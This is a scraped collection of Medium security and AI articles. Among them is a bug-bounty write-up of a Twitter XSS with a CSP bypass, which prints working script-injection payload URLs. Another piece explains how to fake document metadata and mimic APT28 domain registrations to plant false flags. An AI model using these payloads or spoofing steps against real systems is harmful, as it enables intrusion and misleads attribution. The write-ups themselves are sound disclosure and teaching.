[6] Should these transactions eventually actually get included on the chain, this will impose a cost on our attacker in terms of transaction fees, but he’s making his payday on block rewards anyway, so he might as well go hog wild.
[7] For those fortunate enough to be unfamiliar with the term, FUD = “Fear, uncertainty, and doubt,” the spread of which one will inevitably be accused of being motivated by whenever one levels some form of critique at something crypto-related.
Special Thanks to r_sholes for his sleuthing.
Written by
","['Cryptocurrency', 'Cybersecurity', 'Blockchain', 'Bitcoin', 'Hacking']"
Let’s get fancy with false flags - Just another infosec blog type of thing,https://blog.0day.rocks/lets-get-fancy-with-false-flags-28eaabefeff6?source=tag_archive---------6-----------------------,"A lot is going on today with APT28 (allegedly the Russian military intelligence agency GRU). Indeed, they are very prolific and quite good at spear phishing.
They recently targeted the Emmanuel Macron’s campaign and the #EMleaks were mostly attributed to Russia — which makes sense — but is it supported with any fool-proof evidence? No and here is why.
Just install a Russian version of Windows, add a Дмитрий user, setup Microsoft Office, open a new document and voilà! You can now create or edit any Word document that will look like it was written by Dmitry from Moscow. That also works very well with Visual Studio and malware.Second option is to manually edit the raw document. Let’s take a random .docx document, extract it (it’s just a zipped archive) and then modify the docProps/core.xml file that contains the metadata with the author name and timestamps. Great succes, you are now a data tampering troll master.
Antivirus editors and cybersecurity vendors are giving public reports about the Tactics, Techniques, and Procedures (TTPs) of the most advanced APTs. So what is preventing another group of impersonating the methodology of any known APT and mimic them? Nothing, and we’ve already seen in the past malware authors mimicking others people work. So that won’t work either as a proof.
There are known lists of domain names used in cyberattacks by various groups. Every now and then antivirus editors will take over malicious domain names (because they ask nicely, or because the domain is available) in order to track victims. Guess what? APTs can also do that! I found several APT28 related domain names that were used in 2014 that are currently available: asisonlline[.]org, bostondyn[.]com, cublc[.]com, …Anyone can use them now to confuse cyber analysts.
To go even further and as an experiment I setup my own domain mimicking some APT28 artefacts: totally-legit-cloud.email that has been registered using the same information as another APT28 phishing domain used during the attack on EM staff. Upon registering a domain name, registrars will ask you about your name, address, etc. These data are never verified and anyone can fake them so that’s what I did with my new domain name:
This domain (that I own) is now linked with actual APT28 infrastructure according to some threat intelligence OSINT tools:
Almost anything can be spoofed that easily, really.
We can only make assumptions so far. Now that everyone is aware of false flag attacks, APT28 strategists could choose to keep going on with attacks without giving a single f*ck about their fingerprints because they know anyone can impersonate them anyway. So why bother changing your TTPs? Dumb analysts will say “it’s too obvious so it can’t be the Russians”. Yes it can. Maybe it’s not? Only some intelligence agencies may really know what’s up and the Russians will play along that very well.
Metadata might only give us clues. It needs to be corroborated with other sources of intelligence or you’ll fail miserably at threat intel.
Now more than ever, every byte that can be tempered with will be. We’ve seen through leaked documents that both the CIA (UMBRAGE project) and the NSA (Fourth Party team) are already doing so in order to cover their attacks and blame others.
Some people might think at this point “it’s okay because most of the APT IoCs are confidential and only TLP RED”: keep in mind that most APTs are state-sponsored and that all of them have governmental CERT that can access this data legitimately. For instance, the British doesn’t even make a difference when recruiting engineers for defending or attacking networks. Because they know these kinds of attacks are the future of covert CNE operations.
In addition to all that, we have to acknowledge that nowadays hacking is also a way of sending a message. The Russians might want to be seen to send a clear message to the next French president: “you know we can hack you easy peasy, you don’t like Putin ok, but don’t mess with us”.In the military that is called a show of force. And the young Emmanuel Macron will surely remember that he was personally (him and its teams) targeted and somewhat successfully hacked. That’s like having a red dot from a laser of a sniper rifle pointing at you. Scary? Yes. Will it shoot? Maybe.That’s yet another example of cyber as an instrument of deterrence (see also Stuxnet, Shadow Brokers, …).
Don’t rely solely on technical artefacts found here and there to base your opinions. Sometimes it’s not that easy to attribute a computer attack to a known threat actor, things can get a little more complex… Don’t get yourself easily manipulated: think about the implication of the hack and what may be the original intent of the threat actor.Only high confidence concurring sources will help revealing who is behind an attack, otherwise it’s just plain speculation.
Feel free to debate anything I’ve shared on Twitter (@x0rz).
Written by
","['Cybersecurity', 'Security', 'Apt28', 'Threat Intelligence', 'Fake News']"
Limitations of Deep Learning in AI Research - Towards AI - Medium,https://medium.com/towards-artificial-intelligence/limitations-of-deep-learning-in-ai-research-5eed166a4205?source=tag_archive---------1-----------------------,"February 12, 2019, by Roberto Iriondo — last updated: April 7, 2019
Deep learning a subset of machine learning, has delivered super-human accuracy in a variety of practical uses in the past decade. From revolutionizing customer experience, machine translation, language recognition, autonomous vehicles, computer vision, text generation, speech understanding, and a multitude of other AI applications [2].
In contrast to machine learning where an AI agent learns from data based on machine learning algorithms, deep learning is based on a neural network architecture which acts similarly to the human brain, and allows the AI agent to analyze data fed in — in a structure similar to the way humans do. Deep learning models do not require algorithms to specify what to do with the data, which is made possible thanks to the extraordinary amount of data we as humans, collect and consume — which in turn is fed to deep learning models [3].
The “traditional” types of deep learning incorporates a different mix of feed-forward modules (frequently convolutional neural networks) and recurrent neural networks (now and then with memory units, such as LSTM [4] or MemNN [5]). These deep learning models are restricted in their capacity to “reason”, for example to do long chains of deductions, or streamlining a method to land at an answer. The quantity of steps in a computation is restricted by the quantity of layers in feed-forward nets, and by the time-span a recurrent neural network will recollect things.
At that point there’s the murkiness problem. When a deep learning model has been trained, it is not always clear how it goes about making decisions [6]. In numerous settings that is simply not acceptable, regardless of whether it finds the correct solution; i.e. assume a bank utilizes AI to assess your credit-value, and afterward denies you a loan, in numerous states there are laws that state that the bank needs to clarify why — if the bank is using a deep learning model for its loan decision making, their loan department (likely) will not be able to give a clear explanation as to why the loan was denied.
Most importantly there is the absence of common sense. Deep learning models might be the best at perceiving patterns. Yet they cannot comprehend what the patterns mean, and considerably less reason about them. To empower deep learning models to reason, we have to change their structure in order for them to not create a single output (i.e. the interpretability of an image, the translation of a paragraph, etc.), yet as to deliver an entire arrangement of alternative outputs (i.e. different ways a sentence can be translated). This is what energy base models are intended to do: give you a score for every conceivable configuration of the variables to be construed.
Progressively, such weaknesses are raising concerns about AI among the extensive public population, particularly as autonomous vehicles, which utilize comparable deep learning strategies to navigate the roads [7], get associated with setbacks and fatalities [8]. The public has started to say, perhaps there is an issue with AI — in a world where perfection is expected; and even though deep learning on self-driving cars has proven, that it would cause incredibly less casualties than human drivers, humanity itself will not, completely have its trust in autonomous vehicles, until, no casualties are involved.
In addition, deep learning is absolutely restricted in its current form, on the grounds that practically all the fruitful uses of it [19] [20] [21] [22] [23] [24] [25] [26] [27] [28] [29] [30] [31] [32], utilize supervised machine learning with human-comment annotations which has been noted as a significant weakness — this dependence prevents deep neural networks from being applied to problems where input data is scarce. It is imperative to discover approaches to prepare extensive neural nets from “crude” non-commented data in order to catch the regularities of the real world. In which combining deep learning, with adversarial machine learning techniques [17] [18] may lay the answer we are looking for.
In terms of the general population — unfortunately the public, does not have a fair understanding of deep learning. If work in deep learning was confined to only AI research labs it would be one thing. However, deep learning techniques are being used in every possible application nowadays. The level of confidence that tech executives and marketers are placing on deep learning techniques is worrisome. While deep learning is an incredible feat, it is important to not only explore its strengths, but to also focus, and be aware of its weaknesses, in order to have a plan of action.
Mrinmaya Sachan’s research on Towards Literate Artificial Intelligence [33] makes an interesting case in exploring how, even though we have seen notable developments on the field of artificial intelligence thanks to deep learning, today’s AI systems still lack the intrinsic nature of human intelligence. He then dives in and reflects, before humanity starts to build AI systems that posses human capabilities (reasoning, understanding, common-sense), how can we evaluate AI systems on such tasks? — in order to thoroughly understand and develop true intelligent systems. His research proposes the use of standardized tests on AI systems (similarly to the tests that students take towards progressing in the formal education system) by using two frameworks as to further develop AI systems, with notable benefits which can be applied in the form of social good and education.
Artificial neural networks, which try to mimic the architecture of the brain posses a multitude of connections of artificial neurons (nodes), the network itself is not an algorithm but a framework on which a variety of machine learning algorithms can function on to achieve desired tasks. The foundations of neural network engineering are almost completely based on heuristics, with a small emphasis on network architecture choices, unfortunately there is no definite theory which tell us how to decide the right number of neurons for a certain model. There are however theoretical works on the number of neurons and the overall capacity of a model [12] [13] [14], nevertheless, those are rarely practical to apply.
Stanford Professsor, Sanjeev Arora, takes a vivid approach to the generalization theory of deep neural networks [15], in which he mentions the generalization mystery of deep learning as to: Why do trained deep neural networks perform well on previously unseen data? i.e. let us say that you train a deep learning model with ImageNet and train it on images with random labels, high accuracy will be the outcome. However, using normal regularization strategies which infer higher generalization do not help as much [16]. Regardless, the trained neural net is still unable to predict the random labeling of unseen images, which in turn means that the neural network does not generalize.
Recently researchers were able to expose vulnerabilities of a deep neural network architecture by adding small nuances on a large image dataset as to alter (with high probability) the model outputs [9] of the neural network. The study follows several other researchers showing similar levels of brittleness defy the outputs, based on small nuances on the input. These type of results do not inspire confidence, i.e. in autonomous vehicles, the environment is prone to have nuances of all kinds (rain, snow, fog, shadows, false positives, etc.) — now imagine a visual system being thrown off by a small change on its visual input. I am sure that Tesla, Uber and several others have identified these issues and are working on a plan as to address them, however it is important for the public to be aware of them as well.
Nowadays, we are surrounded by technology. From the smart gadgets on our home, smartphones in pour pockets, computers on our desks to the routers that connect us to the internet, etc. In each one of these technologies, the base architectures function properly thanks to the solid engineering principles they were built upon, deep mathematics, physics, electrical, computer and software engineering, etc. and above all these fields — years, if not decades, of statistical testing and quality assurance.
It is important to remember, that deep learning models need a large amount of data to train an initial model (in order to have high accuracy results and not produce overfitting, keep in mind that sub-sequential tasks can learn from transfer learning), and that ultimately without a profound understanding of what is truly happening inside a “deep neural architecture,” it is not practically nor theoretically wise to build technological solutions that are sustainable on the long run.
The author would like to thank Matt Gormley, Assistant Professor at Carnegie Mellon University, and Arthur Chan, Principal Speech Architect, Curator of AIDL.io and Deep Learning Specialist, for constructive criticism in preparation of this article.
DISCLAIMER: The views expressed in this article are those of the author(s) and do not represent the views of Carnegie Mellon University, nor other companies (directly or indirectly) associated with the author(s). These writings are not intended to be final products, yet rather a reflection of current thinking, along being a catalyst for discussion and improvement.
You can find me on My website, Medium, Instagram, Twitter, Facebook, LinkedIn or through my web design company.
[1] Deep Learning Review| Yann LeCun, Yoshua Bengio, Geoffrey Hinton | http://pages.cs.wisc.edu/~dyer/cs540/handouts/deep-learning-nature2015.pdf
[2] 30 Amazing Applications of Deep Learning | Yaron Hadad | http://www.yaronhadad.com/deep-learning-most-amazing-applications/
[3] Introduction to Deep Learning | Bhiksha Raj | Carnegie Mellon University | http://deeplearning.cs.cmu.edu/
[4] Understanding LSTM Networks | Christopher Olah | http://colah.github.io/posts/2015-08-Understanding-LSTMs/
[5] Memory Augmented Neural-Networks | Facebook AI Research | https://github.com/facebook/MemNN
[6] The Dark Secret at the Heart of Artificial Intelligence | MIT Technology Review | https://www.technologyreview.com/s/604087/the-dark-secret-at-the-heart-of-ai/
[7] MIT 6.S094: Deep Learning for Self-Driving Cars | Massachusetts Institute of Technology | https://selfdrivingcars.mit.edu/
[8] List of Self Driving Car Fatalities | Wikipedia | https://en.wikipedia.org/wiki/List_of_self-driving_car_fatalities
[9] One Pixel Attack for Fooling Deep Neural Networks | Jiawei Su, Danilo Vasconcellos Vargas, Kouichi Sakurai | https://arxiv.org/pdf/1710.08864.pdf
[10] Canadian Institute for Advanced Research Dataset | CIFAR-10 Dataset | https://www.cs.toronto.edu/~kriz/cifar.html
[11] Images, courtesy of Machine Learning Memoirs | https://mlmemoirs.xyz
[12] Deep Neural Network Capacity | Aosen Wang, Hua Zhou, Wenyao Xu, Xin Chen | Arxiv | https://arxiv.org/abs/1708.05029
[13] On Characterizing the Capacity of Neural Networks Using Algebraic Topology | William H. Guss, Ruslan Salakhutdinov | Machine Learning Department, School of Computer Science, Carnegie Mellon University | https://arxiv.org/pdf/1802.04443.pdf
[14] Information Theory, Complexity, and Neural Networks | Yaser S. Abu-Mostafa | California Institute of Technology | http://work.caltech.edu/pub/Abu-Mostafa1989nnet.pdf
[15] Generalization Theory and Deep Nets, An Introduction | Sanjeev Arora | Stanford University | http://www.offconvex.org/2017/12/08/generalization1/
[16] Understanding Deep Learning Requires Re-Thinking Generalization | Chiyuan Zhang, Samy Bengio, Moritz Hardt, Benjamin Recht, Oriol Vinyals | https://arxiv.org/pdf/1611.03530.pdf
[17] The Limitations of Deep Learning in Adversarial Settings | Nicolas Papernot, Patrick McDaniel, Somesh Jha, Matt Fredrikson, Z. Berkay Celik, Ananthram Swami | Proceedings of the 1st IEEE European Symposium on Security and Privacy, IEEE 2016. Saarbrucken, Germany | http://patrickmcdaniel.org/pubs/esp16.pdf
[18] Machine Learning in Adversarial Settings | Patrick McDaniel, Nicolas Papernot, and Z. Berkay Celik | Pennsylvania State University | http://patrickmcdaniel.org/pubs/ieeespmag16.pdf
[19] Alex Krizhevsky, Ilya Sutskever, and Geoffrey E. Hinton. Imagenet classification with deep convolutional neural networks. In Advances in Neural Information Processing Systems, 2012.
[20] Yaniv Taigman, Ming Yang, Marc’Aurelio Ranzato, and Lior Wolf. Deepface: Closing the gap to humanlevel performance in face verification. In Proceedings of the IEEE conference on computer vision and pattern recognition, pages 1701–1708, 2014.
[21] Karen Simonyan and Andrew Zisserman. Very deep convolutional networks for large-scale image recognition. Advances in Neural Information Processing Systems, 2015.
[22] Christian Szegedy, Wei Liu, Yangqing Jia, Pierre Sermanet, Scott Reed, Dragomir Anguelov, Dumitru Erhan, Vincent Vanhoucke, Andrew Rabinovich, et al. Going deeper with convolutions. In Proceedings of the IEEE Conference on Computer Vision and Pattern Recognition (CVPR), 2015.
[23] Kaiming He, Xiangyu Zhang, Shaoqing Ren, and Jian Sun. Delving deep into rectifiers: Surpassing human-level performance on imagenet classification. In Proceedings of the IEEE international conference on computer vision, pages 1026–1034, 2015.
[24] Kaiming He, Xiangyu Zhang, Shaoqing Ren, and Jian Sun. Deep residual learning for image recognition. In Proceedings of the IEEE Conference on Computer Vision and Pattern Recognition (CVPR), pages 770–778, 2016.
[25] Geoffrey Hinton, Li Deng, Dong Yu, George E Dahl, Abdel-rahman Mohamed, Navdeep Jaitly, Andrew Senior, Vincent Vanhoucke, Patrick Nguyen, Tara N Sainath, et al. Deep neural networks for acoustic modeling in speech recognition: The shared views of four research groups. IEEE Signal Processing Magazine, 29(6):82–97, 2012.
[26] Awni Hannun, Carl Case, Jared Casper, Bryan Catanzaro, Greg Diamos, Erich Elsen, Ryan Prenger, Sanjeev Satheesh, Shubho Sengupta, Adam Coates, et al. Deep speech: Scaling up end-to-end speech recognition. arXiv preprint arXiv:1412.5567, 2014.
[27] Wayne Xiong, Jasha Droppo, Xuedong Huang, Frank Seide, Mike Seltzer, Andreas Stolcke, Dong Yu, and Geoffrey Zweig. Achieving human parity in conversational speech recognition. arXiv preprint arXiv:1610.05256, 2016.
[28] Chung-Cheng Chiu, Tara N Sainath, Yonghui Wu, Rohit Prabhavalkar, Patrick Nguyen, Zhifeng Chen, Anjuli Kannan, Ron J Weiss, Kanishka Rao, Katya Gonina, et al. State-of-the-art speech recognition with sequence-to-sequence models. arXiv preprint arXiv:1712.01769, 2017.
[29] Dzmitry Bahdanau, Kyunghyun Cho, and Yoshua Bengio. Neural machine translation by jointly learning to align and translate. In International Conference on Learning Representations, 2015.
[30] Ilya Sutskever, Oriol Vinyals, and Quoc V Le. Sequence to sequence learning with neural networks. In Advances in Neural Information Processing Systems, pages 3104–3112, 2014.
[31] Yonghui Wu, Mike Schuster, Zhifeng Chen, Quoc V Le, Mohammad Norouzi, Wolfgang Macherey, Maxim Krikun, Yuan Cao, Qin Gao, Klaus Macherey, et al. Google’s neural machine translation system: Bridging the gap between human and machine translation. arXiv preprint arXiv:1609.08144, 2016.
[32] Hany Hassan, Anthony Aue, Chang Chen, Vishal Chowdhary, Jonathan Clark, Christian Federmann, Xuedong Huang, Marcin Junczys-Dowmunt, William Lewis, Mu Li, et al. Achieving human parity on automatic chinese to english news translation. arXiv preprint arXiv:1803.05567, 2018.
[33] Mrinmaya Sachan, Towards Literate Artificial Intelligence, Machine Learning Department at Carnegie Mellon University, https://pdfs.semanticscholar.org/25c5/6f52c528112da99d0ae7e559500ef7532d3a.pdf
Written by
","['AI', 'ML', 'Data Science', 'Tech', 'Top', 'Latest', 'Get Published', 'Home', 'Artificial Intelligence', 'Machine Learning', 'Deep Learning', 'Cybersecurity', 'Science']"
Machine Learning for Cybersecurity 101 - Towards Data Science,https://towardsdatascience.com/machine-learning-for-cybersecurity-101-7822b802790b?source=tag_archive---------2-----------------------,"The considerable number of articles cover machine learning for cybersecurity and the ability to protect us from cyberattacks. Still, it’s important to scrutinize how actually Artificial Intelligence (AI),Machine Learning (ML),and Deep Learning (DL) can help in cybersecurity right now, and what this hype is all about.
First of all, I have to disappoint you. Unfortunately, machine learning will never be a silver bullet for cybersecurity compared to image recognition or natural language processing, two areas where machine learning is thriving. There will always be a man trying to find weaknesses in systems or ML algorithms and to bypass security mechanisms. What’s worse, now hackers are able to use machine learning to carry out all their nefarious endeavors.
What’s more important, AI is not immune to attacks, and you can read here my new article about it.
Fortunately, machine learning can aid in solving the most common tasks including regression, prediction, and classification. In the era of extremely large amount of data and cybersecurity talent shortage, ML seems to be an only solution.
This article is an introduction written to give practical technical understanding of the current advances and future directions of ML research applied to cybersecurity.
Stop calling everything ‘AI’ — learn the terms.
The definitions show that cybersecurity field refers mostly to machine learning (not to AI). And a large part ofthe tasks are not human-related.
Machine learning means solving certain tasks with the use of an approach and particular methods based on data you have.
Most of tasks are subclasses of the most common ones, which are described below.
There are different approaches in addition to these tasks. You can use only one approach for some tasks, but there can be multiple approaches for other tasks.
Trends of the past:
Current trends
Future trends (well, probably)
Let’s see the examples of different methods that can be used to solve machine learning tasks and how they are related to cybersecurity tasks.
Regression (or prediction) is simple. The knowledge about the existing data is utilized to have an idea of the new data. Take an example of house prices prediction. In cybersecurity, it can be applied to fraud detection. The features (e.g., the total amount of suspicious transaction, location, etc.) determine a probability of fraudulent actions.
As for technical aspects of regression, all methods can be divided into two large categories: machine learning and deep learning. The same is used for other tasks.
For each task, there are the examples of ML and DL methods.
Below is a short list of machine learning methods (having their own advantages and disadvantages) that can be used for regression tasks.
You can find out the detailed explanation of each method here.
For regression tasks, the following deep learning models can be used:
Classification is also straightforward. Imagineyou have two piles of pictures classified by type (e.g., dogs and cats). In terms of cybersecurity, a spam filter separating spams from other messages can serve as an example. Spam filters are probably the first ML approach applied to Cybersecurity tasks.
The supervised learning approachisusually used for classification where examples of certain groups are known. All classes should be defined in the beginning.
Below is the list related to algorithms.
It’s considered that methods like SVM and random forests work best. Keep in mind that there are no one-size-fits-all rules, and they probably won’t operate properly for your task.
Deep learning methods work better if you have more data. But they consume more resources especially if you are planning to use it in production and re-train systems periodically.
Clustering is similar to classification with the only but major difference. The information about the classes of the data is unknown. There is no idea whether this data can be classified. This is unsupervised learning.
Supposedly, the best task for clustering is forensic analysis. The reasons, course, and consequences of an incident are obscure. It’s required to classify all activities to find anomalies. Solutions to malware analysis (i.e., malware protection or secure email gateways) may implement it to separate legal files from outliers.
Another interesting area where clustering can be applied is user behavior analytics. In this instance, application users cluster together so that it is possible to see if they should belong to a particular group.
Usually clustering is not applied to solving a particular task in cybersecurity as it is more like one of the subtasks in a pipeline (e.g., grouping users into separate groups to adjust risk values).
Netflix and SoundCloud recommend films or songs according to your movies or music preferences. In cybersecurity, this principle can be used primarily for incident response. If a company faces a wave of incidents and offers various types of responses, a system learns a type of response for a particular incident (e.g., mark it as a false positive, change a risk value, run the investigation). Risk management solutions can also have a benefit if they automatically assign risk values for new vulnerabilities or misconfigurations built on their description.
There are algorithms used for solving recommendation tasks.
The latest recommendation systems are based on restricted Boltzmann machines and their updated versions, such as promising deep belief networks.
Dimensionality reduction or generalizationis notas popular as classification, but necessary if you deal with complex systems with unlabeled data and many potential features. You can’t apply clustering because typical methods restrict the number of features or they don’t work. Dimensionality reduction can help handle it and cut unnecessary features. Like clustering, dimensionality reduction is usually one of the tasks in a more complex model. As to cybersecurity tasks, dimensionality reduction is common for face detection solutions — the ones you use in your IPhone.
You can find more on dimensionality reduction here (including the general description of the methods and their features).
The task of generative models differs from the above-mentioned ones. While those tasks deal with the existing information and associated decisions, generative models are designed to simulate the actual data (not decisions) based on the previous decisions.
The simple task of offensive cybersecurity is to generate a list of input parameters to test a particular application for Injection vulnerabilities.
Alternatively, you can have a vulnerability scanning tool for web applications. One of its modules is testing files for unauthorized access. These tests are able to mutate existing filenames to identify the new ones. For example, if a crawler detected a file called login.php, it’s better to check the existence of any backup or test its copies by trying names like login_1.php, login_backup.php, login.php.2017. Generative models are good at this.
Recently, GANs showed impressive results. They successfully mimic a video. Imagine how it can be used for generating examples for fuzzing.
Instead of looking at ML tasks and trying to apply them to cybersecurity, let’s look at the common cybersecurity tasks and machine learning opportunities. There are three dimensions (Why, What, and How).
The first dimension is a goal, or a task (e.g., detect threats, predict attacks, etc.). According to Gartner’s PPDR model, all security tasks can be divided into five categories:
The second dimension is a technical layer and an answer to the “What” question (e.g., at which level to monitor issues). Here is the list of layers for this dimension:
Each layer has different subcategories. For example, network security can be Wired,Wireless or Cloud. Restassured thatyou can’t apply the same algorithms with the same hyper parameters to both areas, at least in near future. The reason is the lack of data and algorithms to find better dependencies of the three areas so that it’s possible to change one algorithm to differentones.
The third dimension is a question of “How” (e.g., how to check security of a particular area):
For example, if you are about endpoint protection, looking for the intrusion, you can monitor processes of an executable file, do static binary analysis, analyze the history of actions in this endpoint, etc.
Some tasks should be solved in three dimensions. Sometimes,there are no values in some dimensions for certain tasks. Approaches can be the same in one dimension. Nonetheless, each particular point of this three-dimensional space of cybersecurity tasks has its intricacies.
It’s difficult to detail them all so let’s focus on the most important dimension — technology layers. Look at the cybersecurity solution from this perspective.
Network protection is not a single area buta set of different solutions that focus on a protocol such as Ethernet, wireless, SCADA, or even virtual networks like SDNs.
Network protection refers to well-known Intrusion Detection System (IDS) solutions. Some of them used a kind of ML years ago and mostly dealt with signature-based approaches.
ML in network security implies new solutions called Network Traffic Analytics (NTA) aimed at in-depth analysis of all the traffic at each layer and detect attacks and anomalies.
How can ML help here? There are some examples:
You can find at least 10 papers describing diverse approaches in academic research papers.
More resources:
The new generation of anti-viruses is Endpoint Detection and Response. It’s better to learn features in executable files or in the process behavior. Keep in mind that if you deal with machine learning at endpoint layer, your solution may differ depending on the type of endpoint (e.g., workstation, server, container, cloud instance, mobile, PLC, IoT device). Every endpoint has its own specifics but the tasks are common:
Academic papers about endpoint protection and malware specifically are gaining popularity. Here are a few examples:
Application securityis my favourite area, by the way, especially ERP Security.
Where to use ML in app security? — WAFs or Code analysis, both static and dynamic. To remind you, Application security can differ. There are web applications, databases, ERP systems, SaaS applications, micro services, etc. It’s almost impossible to build a universal ML model to deal with all threats effectively in near future. However, you can try to solve some of tasks.
Here are examples what you can do with machine learning for application security:
More resources providing ideas of using ML for application security:
This area started as Security Information and Event Management (SIEM).
SIEM was able to solve numerous tasks if configured properly including user behavior search and ML. Then the UEBA solutions declared that SIEM couldn’t handle new, more advanced types of attacks and constant behavior change.
The market has accepted thepointthat a special solution is required if the threats are regarded from the user level.
However, even UEBA tools don’t cover all things connected with different user behavior. There are domain users, application users, SaaS users, social networks, messengers, and other accounts that should be monitored.
Unlike malware detection focusing on common attacks and the possibility to train a classifier, user behavior is one of the complex layers and unsupervised learning problem. As a rule, there is no labelled dataset as well as any idea of what to look for. Therefore, the task of creation a universal algorithm for all types of users is tricky in user behavior area. Here are the tasks that companies solve with the help of ML:
More resources:
The process area is the last but not least. While dealing with it, it’s necessary to know a business process in order to find something anomalous. Business processes can differ significantly. You can look for fraud in banking and retail system, or a plant floor in manufacturing. The two are totally different, and they demand a lot of domain knowledge. In machine learning feature engineering (the way you represent data to your algorithm) is essential to achieve results. Similarly, features are different in all processes.
In general, there are the examples of tasks in the process area:
You can find research papers related to banking fraud as ICS and SCADA systems security is much less represented.
More resources
If you want to learn more about machine learning in cybersecurity, here are books that can help:
There are moreareas left. I have outlined the basics. On the one hand, machine learning is definitely not a silver-bullet solution if you want to protect your systems. Undoubtedly, there are many issues with interpretability (particularly for deep learning algorithms), but humans also cannot interpret their own decisions, right?
On the other hand,with the growing amount of data and decreasing number of experts, ML is an only remedy. It works now and will be mandatory soon. It is better to start right now.
Keep in mind, hackers are also starting to use ML in their attacks. My next article will reveal how exactly attackers can utilize ML.
Written by
","['Data Science', 'Machine Learning', 'Programming', 'Visualization', 'AI', 'Journalism', 'More', 'Contribute', 'Machine Learning', 'Cybersecurity', 'Deep Learning', 'Artificial Intelligence', 'Cybercrime']"
Making an XSS triggered by CSP bypass on Twitter. - tbmnull - Medium,https://medium.com/@tbmnull/making-an-xss-triggered-by-csp-bypass-on-twitter-561f107be3e5?source=tag_archive---------5-----------------------,"Hi there,
I’m a security researcher & bug hunter, but still learning. I want to share how hard it was to find an XSS (Cross Site Scripting) on such a huge organization and well secured Twitter.com and how I could achieve it with combining another security vulnerability CSP (Content Security Policy) bypass.
Here is the story:After digging a lot on Twitter’s subdomains, I came across to https://careers.twitter.com/. As you can guess, it is Twitter’s career site, you can search for jobs as an opportunity to work with them, but I search for bugs.
Sometime later, I thought I’ve found a reflection for an XSS on the URL:
https://careers.twitter.com/en/jobs-search.html?location=1"" onmouseover=”alert(1)&q=1&start=70&team=
with the location parameter.
But wait, there was no alert! I couldn’t be able to trigger it! Because they’ve implemented CSP as:
content-security-policy: default-src ‘self’ ; connect-src ‘self’ ; font-src ‘self’ https://*.twimg.com https://*.twitter.com data:; frame-src ‘self’ https://twitter.com https://*.twitter.com [REDACTED] https://*.twitter.com; report-uri https://twitter.com/i/csp_report
and It blocked the javascript alert box to be come to scene. So, I was unsuccessful on getting this work, unfortunately. Then I applied to my master @brutelogic as always and asked him that I’ve found some XSS (didn’t share the details nor domain) but I could not be able to get it work because of the CSP. He adviced me to find a way to bypass it! I already remember his saying: “For god’s sake, stop talking and go find a way to bypass the CSP!”. Thanks bro :)
I tried a lot to find the way, and gave up that time. After trying a lot and looking for something on other domains, I figured out an URL that’s going under the radar within GET requests hiddenly. URL was:
https://analytics.twitter.com/tpm?tpm_cb=
The response Content-type was application/javascript and what I write as the parameter tpm_cb, it was reflecting on the page!
I was lucky this time, and I tried to combine both my findings to make the XSS work. So, I created:
https://careers.twitter.com/en/jobs-search.html?location=1""><script src=//analytics.twitter.com/tpm?tpm_cb=alert(document.domain)>//
willing “><script src= on the XSS reflection will work.
And voila! It worked!
Happy End!
I screamed out in my office and all my colleagues were afraid. Sorry guys :)
I immediately reported these to Twitter via their bug bounty program on Hackerone, they triaged and rewarded me very quickly. Also they fixed the XSS on career site but CSP bypass took a long time to fix. But in the end both sides were satisfied. Thanks to Twitter Security Team and an awesome community hackerone!
Hope this helps newbies like me to develop themselves. And If you want to share your thoughts, just ping me on Twitter: @tbmnull
Thanks for reading.
Written by
","['Security', 'Hacking', 'Infosec', 'Xss Attack', 'Cybersecurity']"
Malware Analysis: First Steps — Creating your lab - Emma McCall - Medium,https://medium.com/@xNymia/malware-analysis-first-steps-creating-your-lab-21b769fb2a64?source=tag_archive---------5-----------------------,"So you want to rip apart malware? You wanna get into its innards, pull out its guts and lay them on the tables to take a look with a microscope? Excellent, I like you.
Student, Hobbyist, Junior Analyst… We all start somewhere. So you’ve found some malware, maybe pulled it off VirusTotal, if you’re in the latter group possibly from your workplace. You’ve stuck it in the ThreatGrid or Hybrid Analysis sandboxes, got a result. What happens when you need to check something off the grid. Files in HA or ThreatGrid can be leaked, upload to VirusTotal Intelligence? There goes your OpSec.
You could run it in IDA Dis-assembler, but you don’t speak shellcode and you don’t dream in ASM… yet. So what do you do, pass it off to a senior analyst who can do it for you? Bah that’s boring. There is plenty we can get from this to do basic triage and identify what’s going on.
Welcome to a two, maybe three part series that going to teach you the basics of Dynamic Malware Analysis. This will mainly be guidance based on what I’ve been learning over the past few months, I’m no superduper expert, but I can help you get past the few pitfalls I’ve had.
In this article we’ll get your lab setup, all we need is a basic set-up, a few tools and our brains. It’ll be surprisingly simple when we dive in, so let’s do it!
So what is our problem and what do we need? Ideally we want an isolated environment that we can run our potentially very dangerous files. We want to be able to see its network communication, without alerting the files creators,. Be able to see what is being changed on the OS, check registry changes, file changes, process creation etc.Additionally, we want to be able to image our environment so it’s easy to return to a known good state… C’mon, you can all see where this is going. Time to fire up VMWare (VirtualBox / KVM are perfectly good free(er) alternatives)….
These are the two environments you will need to have set-up in order to proceed, so for now do the basic installation for the operating systems in your Hypervisor and lets kick off.
If you don’t know Linux basics, Hypervisor Basics or are unfamiliar with windows… Go look at them before continuing.
Pre-ConfigurationEnsure that in VMWare both of your VM’s are showing host-only IP setups:
This is going to be critically important when we start analyzing dangerous files, you can further configure the host only network in the Edit > Virtual Network Editor option in VMware:
You can find further details on configuring VMWare’s virtual switches and host only configuration in their documentation, however for this having 2 IP’s on the same subnet will suffice. By default VMWare ships with VMNet01 which is a pre-configured host-only network that is more than suitable for this.
So you’ve installed your favorite flavor of Linux — Personally I’m using the latest version of Ubuntu Server, you don’t need to give it too much RAM, CPU or Disk Space, all it’s going to be doing is handling network requests. Once done you’re good to start:
As usual the first thing we want to do is update our OS packages, as I’m using Ubuntu I have the pleasure of apt…
This is pretty much best practice, now lets add the iNetSim repository to our installation (you may need to do this from a root shell rather than sudo):
We then add the archive signing key provided by the iNetSim team to our installation to allow apt to verify the digital signatures of the package we’re going to install (Yes the dash at the end is important!):
Update the packages list again to pull the latest versions from the repo we just added:
Then finally we will be ready to install the iNetSim package (and all its dependencies):
If you notice as part of the installation one of the last few lines reads:
We’ve gotta do a little configuration before we’re good to go! Lets fire up our favorite text editor and have at it:
This is the main configuration file for the iNetSim application, we want to modify/uncomment the following lines. Before you do this you will need to know your servers IP (the one you’re on now, you should know that right….)
These options will set both the binding IP for the service and the IP and Domains used within the application, when your malware requests www.malicious.com it’ll get back the IP of your iNetSim so that it forwards the rest of its juicy traffic there.
Save that file and be done with it. Then we move on:
Here we wanna change ENABLED=0 to ENABLED=1, Save, Quit and have a mouthful of beer. That steps done!
To fire up the application whenever you are ready its a fairly simple:
